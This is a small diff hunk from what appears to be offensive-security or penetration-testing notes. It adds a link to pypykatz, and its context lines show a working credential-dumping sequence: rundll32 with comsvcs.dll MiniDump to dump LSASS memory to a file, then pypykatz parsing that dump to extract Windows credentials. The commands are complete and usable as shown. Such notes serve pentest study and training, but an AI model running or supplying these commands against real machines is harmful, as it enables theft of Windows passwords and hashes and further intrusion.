@@ -837,6 +837,7 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 ```
 PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
 ```
+[pypykatz](https://github.com/skelsec/pypykatz)
 ```
 pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
 
